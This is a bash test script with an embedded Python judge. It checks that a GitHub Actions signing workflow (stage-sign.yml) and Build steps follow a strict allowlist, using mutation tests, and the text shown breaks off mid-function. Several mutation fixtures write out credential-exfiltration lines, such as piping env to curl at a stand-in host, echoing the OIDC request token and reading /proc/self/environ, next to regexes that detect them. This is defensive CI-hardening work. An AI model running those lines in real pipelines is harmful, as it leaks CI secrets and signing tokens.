#!/usr/bin/env bash
# proves: REQ-CHAIN-001-AC1, REQ-CHAIN-001-AC2, REQ-CHAIN-001-AC3, REQ-CHAIN-002-AC4, REQ-CHAIN-003-AC5
# The Sign boundary (v0.3.0 rules 50, 50a, 52, 52a, 53a; owner RATIFIED Oct 9), static half. Three judges, each first proven
# on a known-good fixture and on every mutated copy (a judge that cannot fail proves nothing), then applied to the real repo:
#   judge_sign  stage-sign.yml is an ALLOWLIST: a reusable workflow of one job on a GitHub-hosted runner whose only input is
#               `digests`, with no outputs and no secrets, whose steps are exactly, in order:
#                 1. actions/checkout (persist-credentials: false, explicit)
#                 2. actions/download-artifact name witness-build path witness-build (Build's signed Witness record: DATA, never run)
#                 3. run: bash bin/install-scanner.sh cosign     (the signing tool, pinned by checksum like gitsign; the PR adds
#                                                                 cosign to bin/install-scanner.sh)
#                 4. run: printf '%s' "$DIGESTS" > digests.json  (env DIGESTS: ${{ inputs.digests }}, the only env in the job)
#                 5. run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json
#                         --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
#                         (the filenames are PINNED: `--template` names the committed template, from which `sign --check` makes the
#                          per-tag policy with the committed trust file and the tag from GITHUB_REF, rule 57; it verifies Build's
#                          record, compares the digests, THEN signs; the identity token is requested by cosign
#                          inside its own process and no step ever names it)
#                 6. actions/upload-artifact name provenance path provenance
#               Everything else fails closed (rules 52, 52a; 001-AC1..AC3). The four sinks rule 52a names (file, artifact, log,
#               step output) are each a named mutation. QUESTION FOR THE PARENT: cosign (above) or Witness for Sign's signature?
#               Cosign is proposed because the provenance is customer-verifiable and rule 53b needs a Rekor entry, which Witness
#               cannot write (Witness has no Rekor support, rule 53b); the Witness record of Build stays Witness.
#   judge_build 002-AC4: a Build signing step takes nothing from a secret or the job token. Judged when the file has
#               signing steps (stage-build.yml today signs with attest actions and is rewritten in PR 2).
#   judge_tree  001-AC1 (advisor decision b, Oct 9; FINITE GRAMMAR; replaces the script-reach scan of review rounds 4-11): (a) stage-sign.yml
#               is the only workflow file added since v0.2.2; (b) every workflow and composite action is scanned for DIRECT signing calls
#               (provenance only in stage-sign.yml; every other signer listed with a reason in .github/policy/chain-signers.json);
#               (c) every stage-*.yml is judged over a CLOSED KEY SET: workflow keys (name, on, permissions, jobs), job keys (no
#               defaults, container, services, env, uses, secrets; strategy only a matrix of literal labels), step keys (no shell,
#               working-directory, continue-on-error); step env names only from the closed `env_names` list of chain-scripts.json (never
#               BASH_ENV, ENV, PATH, LD_*, PYTHON*, NODE_*, GITHUB_*) and each read whole; step `uses` only a digest-pinned
#               actions/checkout (persist-credentials: false, no ref/repository/path/token), download-artifact (explicit path that cannot
#               overwrite a listed script, bin/ or .github/) or upload-artifact (no local composite action, docker://, github-script, job-level
#               reusable call); and every `run:` line is exactly `set -euo pipefail`, `bash PATH ARGS`, `python3 PATH ARGS` or
#               `printf '%s' "$NAME" > digests.json` (any other printf line is an error), PATH a plain relative literal LISTED in
#               .github/policy/chain-scripts.json with the sha256 the file has, ARGS literals or whole "$NAME" reads of the step's env:
#               (anything else at command position is an error naming file and line: a variable, glob, make, xargs, find, npm, run-parts,
#               a pipe, `;`/`&&`, a direct tool); (d) a LISTED script is NOT parsed: scan_script is a conservative text scan over the raw
#               file (any extension or shebang): a command from the finite DENY list not in its `tools`, another script not in its `runs`,
#               `witness run ... --` followed by anything but a literal path in `runs`, setting PATH/BASH_ENV/LD_*/PYTHON*; its signing calls
#               are judged from the row's `signs` on the raw text (comments, quotes, heredocs included); a signs=provenance script is
#               reachable only from stage-sign.yml (except via a `sign_subcommand` row such as bin/chain-verify.py, whose `sign` call text
#               is itself a provenance signer). STATED EXCLUSION: a command or script path built at run time inside a listed script is not
#               detected; listed scripts are committed, sha256-bound and reviewed at PR time (row 78). No variable resolver, heredoc
#               stripping, glob/make following, carve-out for test scripts or ci.yml pins remains. On the real repo this judge is RED
#               until PRs 2-4 replace the old stage files with grammar-conforming ones and add chain-scripts.json.
#   (shared)    the signer table bin/chain-test-signers.json is read by this test and by chain-records-test.sh, so the two cannot
#               disagree about what a signer is; comments are stripped before matching (a trailing `# verify` exempts nothing).
# Stated exclusions: a signer reached only through an argv array in script code (exec.exec('cosign', ['sign'])), a python/js
# script that spawns another program, or a binary downloaded at run time is not seen by a text table; the Sign job's own allowlist
# and the dry run cover the Sign side. The engine and table are bin/chain-test-signers.py / .json (shared with chain-records-test.sh).
# Needs python3 with PyYAML (apt: python3-yaml).
# Modelled on: this repo's bin/workflow-consolidation-test.sh (judge + mutation pattern); in-toto-witness docs/commands.md
# (witness run / sign flags) and docs/attestors/slsa.md for the signing-call patterns.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (apt install python3-yaml)"; exit 1; }
cat > "$work/judge.py" <<'PY'
import glob, json, os, re, sys, yaml
SHA = r"[0-9a-f]{40}"
TOKEN = r"ACTIONS_ID_TOKEN|ACTIONS_RUNTIME|id-token|getIDToken|oidc|/proc/\S*environ|\bprintenv\b|\benv\b\s*(\||>|$)|\bset\s+-\w*x"
def load(path):
    return yaml.load(open(path).read(), Loader=yaml.BaseLoader), open(path).read()

sys.path.insert(0, os.path.join(os.environ["CHAIN_ROOT"], "bin"))
import importlib.util
_spec = importlib.util.spec_from_file_location("chain_test_signers", os.path.join(os.environ["CHAIN_ROOT"], "bin/chain-test-signers.py"))
_cts = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(_cts)
TABLE = _cts.load_table()
strip, logical = _cts.strip, _cts.logical
def signer_calls(text, strip_comments=True): return _cts.signer_calls(text, TABLE, strip_comments)

R_PRINTF = r"printf '%s' \"\$DIGESTS\" > digests\.json"
R_INSTALL = r"bash bin/install-scanner\.sh cosign"
R_SIGN = r"python3 bin/chain-verify\.py sign --check --signer cosign --digests digests\.json --build-record witness-build/build-collection\.json --template \.github/policy/release-policy\.template\.json --out provenance"
def judge_sign(path):
    if not os.path.exists(path): return ["missing: " + path]
    d, text = load(path); bad = []
    extra_top = set(d) - {"name", "on", "permissions", "jobs"}
    if extra_top: bad.append("AC3: top-level keys %s are not allowed (defaults.run.shell, concurrency, run-name, env can reroute every run step)" % sorted(extra_top))
    on = d.get("on")
    if not isinstance(on, dict) or set(on) != {"workflow_call"}:
        bad.append("AC1: on: must be exactly workflow_call: %s" % on)
    call = (on or {}).get("workflow_call") or {} if isinstance(on, dict) else {}
    inputs = call.get("inputs") or {}
    if set(inputs) != {"digests"} or (inputs.get("digests") or {}).get("type") != "string":
        bad.append("AC2: the only input must be `digests` (string), found %s" % sorted(inputs))
    if call.get("secrets"): bad.append("AC3: the workflow declares secrets")
    if call.get("outputs"): bad.append("AC3 (step output sink): workflow_call outputs are not allowed")
    if d.get("env"): bad.append("AC3: workflow-level env is not allowed")
    if re.search(r"secrets\b|toJSON|\bcontext\b", text): bad.append("AC3/002-AC4: secrets, toJSON or context appear in the file")
    jobs = d.get("jobs") or {}
    if len(jobs) != 1: bad.append("AC1: exactly one job required, found %d" % len(jobs))
    for name, j in jobs.items():
        ro = j.get("runs-on")
        if not isinstance(ro, str) or not re.fullmatch(r"ubuntu-[0-9.]+(-arm)?|ubuntu-latest", ro):
            bad.append("AC1: job %s must run on a GitHub-hosted ubuntu runner, got %r" % (name, ro))
        for k in ("container", "services", "uses", "env", "outputs", "strategy", "needs", "environment", "defaults", "if", "secrets"):
            if k in j: bad.append("AC2/AC3: job %s has `%s`, which Sign's job must not have" % (name, k))
        perm = j.get("permissions")
        if not isinstance(perm, dict) or perm.get("id-token") != "write" or any(v == "write" for k, v in perm.items() if k != "id-token"):
            bad.append("AC3: Sign's permissions must be id-token: write and no other write: %s" % perm)
        order = []
        for s in j.get("steps") or []:
            sn = s.get("name") or s.get("uses") or s.get("run")
            extra = set(s) - {"name", "uses", "with", "run", "env", "id"}
            if extra: bad.append("AC2: step %r has %s" % (sn, sorted(extra)))
            u, w, run, env = s.get("uses"), s.get("with") or {}, s.get("run"), s.get("env") or {}
            if (u is None) == (run is None): bad.append("AC2: step %r must have exactly one of uses/run" % sn); continue
            if u is not None and env: bad.append("AC3: step %r passes env to an action" % sn)
            if u is not None:
                m = re.fullmatch(r"(actions/[a-z-]+)@(%s)( #.*)?" % SHA, u)
                if not m: bad.append("AC2: step %r uses %r; only a pinned actions/checkout, download-artifact or upload-artifact" % (sn, u)); continue
                act = m.group(1)
                if act == "actions/checkout":
                    order.append("checkout")
                    if set(w) - {"persist-credentials", "fetch-depth"} or w.get("persist-credentials") != "false":
                        bad.append("AC3: checkout must say persist-credentials: false explicitly (the default writes the job token into .git/config): %s" % w)
                elif act == "actions/download-artifact":
                    order.append("download")
                    if w.get("name") != "witness-build" or set(w) - {"name", "path"} or w.get("path", "witness-build") != "witness-build":
                        bad.append("AC2: step %r downloads %s; only the artifact witness-build into witness-build (data, never run)" % (sn, w))
                elif act == "actions/upload-artifact":
                    order.append("upload")
                    if w.get("path") != "provenance" or w.get("name") != "provenance" or set(w) - {"name", "path", "if-no-files-found", "retention-days"}:
                        bad.append("AC3 (artifact sink): step %r uploads %s; only the path `provenance` (name provenance) may leave Sign" % (sn, w))
                else:
                    bad.append("AC2: step %r uses %s, which Sign may not" % (sn, act))
            else:
                line = run.strip()
                if "\n" not in line and re.fullmatch(R_PRINTF, line):
                    order.append("printf")
                    if env != {"DIGESTS": "${{ inputs.digests }}"}: bad.append("AC3: the digests step must have exactly env DIGESTS: ${{ inputs.digests }}, found %s" % env)
                elif "\n" not in line and re.fullmatch(R_INSTALL, line):
                    order.append("install")
                    if env: bad.append("AC3: step %r passes env" % sn)
                elif "\n" not in line and re.fullmatch(R_SIGN, line):
                    order.append("sign")
                    if env: bad.append("AC3: the signing step passes env %s; the digests come from the file" % sorted(env))
                else:
                    sinks = [n for n, rx in (("file", r">>?\s*\S|\btee\b|\bcp\b|\bmv\b"), ("log", r"\becho\b|\bprintf\b|\bcat\b|\bset\s+-\w*x"),
                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", r"upload|curl|\bgh\b")) if re.search(rx, run)]
                    why = "touches the identity token request (sinks reachable: %s)" % (", ".join(sinks) or "none, but no step may touch it") if re.search(TOKEN, run, re.I) else "is not one of the three allowed command lines (install cosign; write digests.json from env; chain-verify.py sign --check ... --out provenance)"
                    bad.append("AC2/AC3: run step %r %s" % (sn, why))
                if "${{" in run or ".." in run: bad.append("AC2: run step %r interpolates an expression or uses `..`" % sn)
        want = ["checkout", "download", "install", "printf", "sign", "upload"]
        if order != want: bad.append("AC2: Sign's steps must be exactly %s in that order (the check-then-sign step is the only signer), found %s" % (want, order))
    return bad

def judge_build(path):
    if not os.path.exists(path): return []
    d, text = load(path); bad = []
    wf_env = d.get("env") or {}
    for jn, j in (d.get("jobs") or {}).items():
        steps = j.get("steps") or []
        signs = [s for s in steps if signer_calls(yaml.dump(s, width=10**6))]
        if not signs: continue
        job_blob = yaml.dump([j.get("env") or {}, j.get("secrets") or {}, wf_env], width=10**6)
        if re.search(r"secrets\.|secrets\[|github\.token|toJSON|secrets\b", job_blob) or j.get("environment") or j.get("secrets"):
            bad.append("002-AC4: job %s has signing steps and job/workflow-level env, secrets or an environment that can hand a secret to them" % jn)
        for s in steps:
            if re.search(r"GITHUB_ENV", str(s.get("run") or "")) and re.search(r"secrets\.|github\.token|toJSON|ACTIONS_ID_TOKEN|\$\{\{", str(s.get("run") or "") + yaml.dump(s.get("env") or {}, width=10**6)):
                bad.append("002-AC4: job %s writes a secret or token into GITHUB_ENV in a job that signs" % jn)
        for s in signs:
            blob = yaml.dump(s, width=10**6); nm = s.get("name") or s.get("uses")
            if re.search(r"secrets\.|secrets\[|github\.token|toJSON|secrets\b", blob):
                bad.append("002-AC4: signing step %r takes a secret or the job token" % nm)
            for fm in re.finditer(r"--(annotation|certificate-[a-z-]+|oidc-[a-z-]+|fulcio-oidc-client-id|signer-fulcio-[a-z-]+)[ =]+\S*\$\{\{", blob):
                bad.append("002-AC4: signing step %r puts an expression into %s" % (nm, fm.group(1)))
    return bad

def judge_tree(base):
    """001-AC1 (advisor decision b, Oct 9; finite grammar, replaces the script-reach scan): (a) stage-sign.yml is the only new workflow
    file; (b) the direct signer-call scan of every workflow and composite action (listed with a reason in chain-signers.json;
    provenance only in stage-sign.yml); (c) every stage-*.yml is judged over a closed key set, a closed `uses` list, a closed env name
    set and the run-line grammar, running only LISTED scripts (chain-scripts.json, by path and sha256); (d) every listed script gets
    the conservative text scan (tools, runs, launcher argv, PATH-like assignments) and signs only as its row says; a provenance
    signer is reachable only from stage-sign.yml."""
    bad = []
    known = set("""acceptance.yml agent-review-gate.yml auditor.yml ci.yml codeql.yml dependabot-auto-merge.yml dependabot-reviewer.yml
go-freshness.yml main-candidate-rescan.yml release.yml reserved-branch-guard.yml scan.yml scorecard.yml
stage-acceptance-artifacts.yml stage-acceptance-egress.yml stage-acceptance-k8s.yml stage-acceptance-predicate.yml
stage-admission.yml stage-authorize.yml stage-build.yml stage-image.yml stage-promote.yml stage-reproducibility.yml
stage-verify.yml supply-chain.yml""".split())
    wfdir = os.path.join(base, ".github/workflows")
    files = sorted(glob.glob(wfdir + "/*.yml") + glob.glob(wfdir + "/*.yaml"))
    new = sorted(os.path.basename(f) for f in files if os.path.basename(f) not in known)
    if new != ["stage-sign.yml"]: bad.append("AC1: workflow files added since v0.2.2 must be exactly [stage-sign.yml], found %s" % new)
    allowed = {}
    sf = os.path.join(base, ".github/policy/chain-signers.json")
    if not os.path.exists(sf): bad.append("AC1: missing .github/policy/chain-signers.json (the signing calls other than Sign's provenance, each with a reason)")
    else:
        for r in json.load(open(sf)).get("signers") or []:
            if not str(r.get("reason") or "").strip(): bad.append("AC1: signer row without a reason: %s" % r)
            if any(pv for e in TABLE if re.search(e["regex"], str(r.get("tool", ""))) for pv in [e["prov"] == "always"]): bad.append("AC1: signer list names a provenance signer: %s" % r)
            allowed.setdefault(r.get("file"), set()).add(r.get("tool"))
    acts = glob.glob(os.path.join(base, ".github/actions/**/action.y*ml"), recursive=True) + glob.glob(os.path.join(base, "action.y*ml"))
    def check(rel, text):
        for e, pv, line in signer_calls(text):
            if rel == "stage-sign.yml": continue
            if pv:
                bad.append("AC1: %s signs provenance (%s: %s); only stage-sign.yml may" % (rel, e["name"], line[:80]))
            elif e["name"] not in allowed.get(rel, set()):
                bad.append("AC1: %s calls %r, which is not listed with a reason in chain-signers.json" % (rel, e["name"]))
    for f in files + sorted(acts):
        rel = os.path.relpath(f, wfdir) if f in files else os.path.relpath(f, base)
        check(rel, open(f).read())
    rows, errs, envn = _cts.load_scripts(base)
    bad += ["AC1: " + e for e in errs]
    ran = {}
    for f in files:
        rel = os.path.basename(f)
        if not rel.startswith("stage-"): continue
        try: d = yaml.load(open(f).read(), Loader=yaml.BaseLoader) or {}
        except Exception as e: bad.append("AC1: %s does not parse (%s)" % (rel, e)); continue
        e, r = _cts.stage_grammar(rel, d, rows, envn)
        bad += ["AC1 grammar: " + x for x in e]; ran[rel] = set(r)
    def closure(paths):
        seen, todo = set(), list(paths)
        while todo:
            p = todo.pop()
            if p in seen or p not in rows: continue
            seen.add(p); todo += list(rows[p].get("runs") or [])
        return seen
    reach = {rel: closure(p) for rel, p in ran.items()}
    for p, row in sorted(rows.items()):
        text = open(os.path.join(base, p), errors="replace").read()
        bad += ["AC1: " + x for x in _cts.scan_script(p, text, row, rows, base)]
        signs = row.get("signs", False)
        for e, pv, line in signer_calls(text, False):      # raw text: a signer name in a comment, quote or heredoc counts
            if pv and signs != "provenance": bad.append("AC1: %s signs provenance (%s) but its row says signs=%r" % (p, e["name"], signs))
            elif not pv and not signs: bad.append("AC1: %s calls %s but its row says it signs nothing" % (p, e["name"]))
        if signs == "provenance" and not row.get("sign_subcommand"):
            for rel, rs in reach.items():
                if p in rs and rel != "stage-sign.yml": bad.append("AC1: %s signs provenance but %s runs it (only stage-sign.yml may)" % (p, rel))
    return bad

def judge_calls(root):
    """REQ-CHAIN-003-AC5 (pipeline reading, advisor to confirm): a certificate's SAN is the file that runs the witness step
    (harness spike (b), case 5: a stage that calls another stage's file gets that file's SAN). So only release.yml may call
    stage-sign.yml and no stage file may call another stage file; other workflows (scan.yml, main-candidate-rescan.yml) may
    still call stage-build.yml / stage-image.yml, because the release policy pins the Build Config URI (release.yml at the tag)."""
    bad = []
    wd = os.path.join(root, ".github/workflows")
    for fn in sorted(os.listdir(wd)):
        if not fn.endswith((".yml", ".yaml")) or fn == "release.yml": continue
        try: d = yaml.load(open(os.path.join(wd, fn)).read(), Loader=yaml.BaseLoader) or {}
        except Exception as e: bad.append("AC5: %s does not parse (%s)" % (fn, e)); continue
        for jn, j in (d.get("jobs") or {}).items():
            refs = [str(j.get("uses", ""))] + [str(s.get("uses", "")) for s in (j.get("steps") or [])]
            for r in refs:
                if re.search(r"\.github/workflows/stage-sign\.ya?ml", r):
                    bad.append("AC5: %s job %s calls %s; only release.yml may call stage-sign.yml" % (fn, jn, r))
                elif fn.startswith("stage-") and re.search(r"\.github/workflows/stage-[^@\s]*\.ya?ml", r):
                    bad.append("AC5: %s job %s calls %s; a stage file may not call another stage file" % (fn, jn, r))
    return bad

if __name__ == "__main__":
    which, arg = sys.argv[1], sys.argv[2]
    bad = {"sign": judge_sign, "build": judge_build, "tree": judge_tree, "calls": judge_calls}[which](arg)
    print("; ".join(dict.fromkeys(bad)) or "ok"); sys.exit(1 if bad else 0)
PY
export CHAIN_SIGNER_TABLE="$root/bin/chain-test-signers.json" CHAIN_ROOT="$root"
judge() { python3 "$work/judge.py" "$@"; }
expect() { # expect ok|caught LABEL judge ARG
  local out rc=0
  out=$(judge "$3" "$4") || rc=$?
  if [ "$1" = ok ] && [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "ok   $2"
  elif [ "$1" = caught ] && [ "$rc" != 0 ]; then pass=$((pass + 1)); echo "ok   $2 (caught: ${out:0:160})"
  else failn=$((failn + 1)); echo "FAIL $2 -> ${out:0:500}"; fi
}
sha=$(printf 'a%.0s' $(seq 40))
good="$work/good.yml"
cat > "$good" <<EOF
name: 'Stage: sign'
on:
  workflow_call:
    inputs:
      digests:
        description: 'JSON of the digests Build produced'
        required: true
        type: string
permissions:
  contents: read
jobs:
  sign:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@$sha # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/download-artifact@$sha # v8
        with:
          name: witness-build
          path: witness-build
      - name: install the signing tool (pinned by checksum)
        run: bash bin/install-scanner.sh cosign
      - name: write the digest list to a file
        env:
          DIGESTS: \${{ inputs.digests }}
        run: printf '%s' "\$DIGESTS" > digests.json
      - name: check Build's record, compare the digests, then sign the provenance
        run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
      - uses: actions/upload-artifact@$sha # v7
        with:
          name: provenance
          path: provenance
EOF
# mutate LABEL  python-regex  replacement : writes $work/LABEL.yml, or counts a FAILURE if the mutation did not apply
mutate() {
  python3 - "$good" "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml" "$2" "$3" <<'PY' || { failn=$((failn + 1)); echo "FAIL mutation $1 did not apply to the fixture"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
n = re.sub(sys.argv[3], lambda m: sys.argv[4].replace("\\n", "\n").replace("\\t", "\t"), t, count=1, flags=re.S)
if n == t: sys.exit(1)
open(sys.argv[2], "w").write(n)
PY
}
caught() { # LABEL regex replacement
  if mutate "$1" "$2" "$3"; then expect caught "$1" sign "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml"; fi
}
SIGNLINE='run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance'
expect ok "fixture: known-good Sign passes the judge" sign "$good"
caught "AC1 self-hosted runner" 'ubuntu-24.04' 'self-hosted'
caught "AC1 extra trigger" 'workflow_call:' 'push:\n  workflow_call:'
caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubuntu-24.04\n    steps:'
caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "defaults:\n  run:\n    shell: \"bash -c 'env | curl -d @- https://x.example; bash {0}'\"\npermissions:\n  contents: read\njobs"
caught "AC3 workflow-level concurrency" 'permissions:\n  contents: read\njobs' "concurrency: x\npermissions:\n  contents: read\njobs"
caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run-name: x\npermissions:\n  contents: read\njobs"
caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
caught "AC2 downloads another artifact" 'name: witness-build' 'name: dist'
caught "AC2 downloads into a parent path" 'path: witness-build' 'path: ..'
caught "AC2 fetches build output with gh" "$SIGNLINE" 'run: gh run download 1 -D dist'
caught "AC2 runs a build output" "$SIGNLINE" 'run: bash dist/run.sh'
caught "AC2 interpolates the input into the shell" 'run: printf .%s. "\$DIGESTS" > digests.json' "run: printf '%s' '\${{ inputs.digests }}' > digests.json"
caught "AC2 two commands in one run step" "out provenance" 'out provenance; curl https://example.com'
caught "AC2 unpinned action" "actions/checkout@$sha" 'actions/checkout@v4'
caught "AC2 github-script step" "      - uses: actions/checkout" "      - uses: actions/github-script@$sha\n        with:\n          script: core.setOutput('t', await core.getIDToken())\n      - uses: actions/checkout"
caught "AC2 the Sign step does not check (no --check)" ' --check' ''
caught "AC2 the Sign step only verifies (verify, not sign --check)" 'chain-verify.py sign --check --signer cosign' 'chain-verify.py verify --record witness-build/build-collection.json #'
caught "AC2 the Sign step has no Build record" ' --build-record witness-build/build-collection.json' ''
caught "AC2 the Sign step reads the digests inline, not from the file" '--digests digests.json' '--digests "\$DIGESTS"'
caught "AC2 the Sign step uses another signer" '--signer cosign' '--signer witness'
caught "AC2 the signing tool is not installed from the pinned installer" 'run: bash bin/install-scanner.sh cosign' 'run: curl -sL https://example.com/cosign -o cosign'
caught "AC2 the signing step runs before the tool is installed" '      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
caught "AC2 two signing steps" "        $SIGNLINE" "        $SIGNLINE\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance"
caught "AC2 a permissive policy file instead of the template" 'release-policy.template.json' 'permissive.json'
caught "AC2 a different Build record file name" 'witness-build/build-collection.json' 'witness-build/other.json'
caught "AC2 the policy argument points outside .github/policy" '--template .github/policy/release-policy.template.json' '--template /tmp/p.json'
caught "AC3 checkout without persist-credentials: false" '        with:\n          persist-credentials: false\n' ''
caught "AC3 checkout with persist-credentials: true" 'persist-credentials: false' 'persist-credentials: true'
caught "AC3 secret reference" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          K: ${{ secrets.KEY }}'
caught "AC3 toJSON(secrets)" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ toJSON(secrets) }}'
caught "AC3 job token passed in env" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          T: ${{ github.token }}'
caught "AC3 env on the signing step" "      - name: check Build's record" "      - env:\n          X: y\n        name: check Build's record"
caught "AC3 sink step output: a job output" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    outputs:\n      t: ${{ steps.x.outputs.t }}'
caught "AC3 sink step output: a workflow output" '        type: string\npermissions' '        type: string\n    outputs:\n      o:\n        value: x\npermissions'
caught "AC3 sink step output: token to GITHUB_OUTPUT" "$SIGNLINE" 'run: echo "tok=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> "$GITHUB_OUTPUT"'
caught "AC3 sink file: token to a file" "$SIGNLINE" 'run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok"'
caught "AC3 sink log: token echoed" "$SIGNLINE" 'run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"'
caught "AC3 sink log: whole environment dumped (printenv)" "$SIGNLINE" 'run: printenv'
caught "AC3 sink log: whole environment piped out (env)" "$SIGNLINE" 'run: env | curl -d @- https://example.com'
caught "AC3 sink file: /proc/self/environ" "$SIGNLINE" 'run: cat /proc/self/environ'
caught "AC3 sink artifact: upload path outside provenance" 'path: provenance' 'path: ${{ runner.temp }}/tok'
caught "AC3 sink artifact: upload path provenance/.." 'path: provenance\n' 'path: provenance/..\n'
caught "AC3 sink artifact: upload a second artifact" "          path: provenance" "          path: provenance\n      - uses: actions/upload-pages-artifact@$sha\n        with:\n          path: ."
caught "AC3 extra write permission" 'id-token: write' 'id-token: write\n      packages: write'
caught "AC3 no id-token" 'id-token: write' 'id-token: none'
# 002-AC4: Build's signing steps (the judge runs on a fixture here, and on the real stage-build.yml when it exists)
cat > "$work/build-good.yml" <<EOF
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - name: Witness-wrapped build
        run: witness run --step build --signer-fulcio-url https://fulcio.sigstore.dev -- ./bin/build.sh
EOF
expect ok "fixture: a Build signing step with no secret passes" build "$work/build-good.yml"
sed 's#witness run#witness run --signer-fulcio-oidc-client-id ${{ inputs.cid }}#' "$work/build-good.yml" > "$work/build-expr.yml"
expect caught "002-AC4 an expression in a certificate/OIDC flag" build "$work/build-expr.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          K: ${{ secrets.KEY }}' > "$work/build-sec.yml"
expect caught "002-AC4 a secret in a signing step" build "$work/build-sec.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          T: ${{ github.token }}' > "$work/build-tok.yml"
expect caught "002-AC4 the job token in a signing step" build "$work/build-tok.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    env:" '      K: ${{ secrets.KEY }}' "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-jobenv.yml"
expect caught "002-AC4 a secret in the JOB-level env of a job that signs" build "$work/build-jobenv.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    environment: release" "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-environment.yml"
expect caught "002-AC4 a job that signs runs in a GitHub environment (environment secrets)" build "$work/build-environment.yml"
printf '%s\n' "env:" '  K: ${{ secrets.KEY }}' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-wfenv.yml"
expect caught "002-AC4 a secret in the WORKFLOW-level env of a file that signs" build "$work/build-wfenv.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - name: long line" "        run: echo start && echo a-very-long-prefix-that-forces-a-yaml-dump-to-wrap-the-line-at-eighty-columns-xxxxxxxxxxxxxxxxxxxx && witness run --step build -- ./bin/build.sh" "        env:" '          K: ${{ secrets.KEY }}' > "$work/build-wrap.yml"
expect caught "002-AC4 a secret in a signing step whose command line is long enough for yaml.dump to wrap" build "$work/build-wrap.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - run: echo \"K=\${{ secrets.KEY }}\" >> \"\$GITHUB_ENV\"" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-ghenv.yml"
expect caught "002-AC4 a secret written to GITHUB_ENV by an earlier step of a job that signs" build "$work/build-ghenv.yml"
# 001-AC1 (advisor decision, Oct 9, replaces the script-reach scan): the tree judge on fixture trees. A stage file may only run what
# .github/policy/chain-scripts.json lists (path + sha256); a listed script may use only its tools and start only its `runs`.
gen() { python3 - "$1" <<'PY'
import hashlib, json, os, sys
d = sys.argv[1]
out = []
for r in json.load(open(d + "/.spec.json")):
    r = dict(r); r["sha256"] = hashlib.sha256(open(os.path.join(d, r["path"]), "rb").read()).hexdigest(); out.append(r)
json.dump({"env_names": ["DIGESTS", "V", "X1"], "scripts": out}, open(d + "/.github/policy/chain-scripts.json", "w"))
PY
}
edit_spec() { # edit_spec DIR 'python statements over rows (dict by path)' : edits the spec, then rewrites chain-scripts.json with fresh hashes
  python3 -c 'import json,sys;d=sys.argv[1];s=json.load(open(d+"/.spec.json"));rows={r["path"]:r for r in s};exec(sys.argv[2]);json.dump(list(rows.values()),open(d+"/.spec.json","w"))' "$1" "$2"
  gen "$1"
}
setfile() { printf '%b' "$3" > "$1/$2"; }                     # setfile DIR path 'content' (content NOT re-hashed: call gen/edit_spec after, or not, on purpose)
stage() { # stage DIR 'run text' [step-env-key] : stage-verify.yml with one run step
  { printf 'jobs:\n  j:\n    steps:\n      - run: |\n'; printf '%s\n' "$2" | sed 's/^/          /'; } > "$1/.github/workflows/stage-verify.yml"
}
mk() {
  local d="$work/$1"; rm -rf "$d"; mkdir -p "$d/.github/workflows" "$d/.github/policy" "$d/.github/actions/x" "$d/bin"
  for f in acceptance auditor ci stage-promote stage-verify stage-reproducibility; do printf 'jobs: {}\n' > "$d/.github/workflows/$f.yml"; done
  cp "$good" "$d/.github/workflows/stage-sign.yml"
  printf 'jobs:\n  b:\n    steps:\n      - run: |\n          set -euo pipefail\n          bash bin/build-stage.sh apk\n' > "$d/.github/workflows/stage-build.yml"
